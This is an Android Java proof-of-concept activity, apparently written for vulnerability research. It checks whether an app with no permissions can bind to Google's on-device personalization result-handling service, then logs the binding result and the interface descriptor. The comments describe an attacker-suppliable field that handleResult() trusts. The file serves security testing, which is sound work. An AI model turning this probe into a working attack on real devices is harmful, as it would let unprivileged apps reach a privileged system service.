package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

// OdpResultHandlingService (com.google.android.ondevicepersonalization.services) is
// exported with NO manifest permission (confirmed via dumpsys resolver table, unlike
// its sibling OdpExampleStoreService which requires BIND_EXAMPLE_STORE_SERVICE).
// It extends the platform framework class android.federatedcompute.ResultHandlingService.
// This probes whether that framework base class enforces its own caller check in
// onBind() before a zero-perm app can obtain a live Binder to call handleResult(),
// which trusts an attacker-suppliable "context_data" packageName/className field.
public class OdpResultBindProbeActivity extends Activity {
    private static final String T = "ODP_RESULT_PROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== OdpResultHandlingService zero-permission bind probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        Intent intent = new Intent("android.federatedcompute.COMPUTATION_RESULT");
        intent.setComponent(new ComponentName(
            "com.google.android.ondevicepersonalization.services",
            "com.android.ondevicepersonalization.services.federatedcompute.OdpResultHandlingService"));

        ServiceConnection conn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Log.w(T, "[!!!] BOUND with ZERO permissions: " + name);
                try {
                    Log.w(T, "  interface desc=" + service.getInterfaceDescriptor());
                } catch (Exception e) {
                    Log.w(T, "  desc error: " + e);
                }
                try { unbindService(this); } catch (Exception e) {}
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.w(T, "[x] Disconnected");
            }
        };

        try {
            boolean bound = bindService(intent, conn, Context.BIND_AUTO_CREATE);
            Log.w(T, "bindService() returned " + bound);
        } catch (SecurityException se) {
            Log.w(T, "[-] bindService SecurityException: " + se.getMessage());
        } catch (Exception e) {
            Log.w(T, "[-] bindService exception: " + e);
        }
    }
}
